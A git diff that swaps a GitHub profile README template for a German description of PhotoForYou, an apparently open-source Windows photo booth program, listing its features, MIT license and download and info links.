@@ -1,16 +1,17 @@
-## Hi there 👋
+# PhotoForYou – Open-Source Fotobox-Software
 
-<!--
-**PhotoForYou/PhotoForYou** is a ✨ _special_ ✨ repository because its `README.md` (this file) appears on your GitHub profile.
+**PhotoForYou (PFY)** ist eine **kostenlose Open-Source-Fotobox-Software** für Windows mit:
+✅ Livebild mit 10 fps während des Countdowns  
+✅ Touch-optimierter Benutzeroberfläche  
+✅ Direkter Druckfunktion auf den Standarddrucker  
+✅ Fotogalerie mit Scroll- & Druckoption  
+✅ Offline-Nutzung ohne Cloud-Abhängigkeit  
 
-Here are some ideas to get you started:
+🖥 **Plattform:** Windows 10/11 mit WSL2  
+🏷 **Lizenz:** MIT (frei nutzbar & modifizierbar)  
 
-- 🔭 I’m currently working on ...
-- 🌱 I’m currently learning ...
-- 👯 I’m looking to collaborate on ...
-- 🤔 I’m looking for help with ...
-- 💬 Ask me about ...
-- 📫 How to reach me: ...
-- 😄 Pronouns: ...
-- ⚡ Fun fact: ...
--->
+📥 **Download & Installation:**  
+http://www.photo4you.duckdns.org/PFY_Setup.zip 
+
+📸 **Mehr Infos:**  
+http://www.photo4you.duckdns.org/index.html
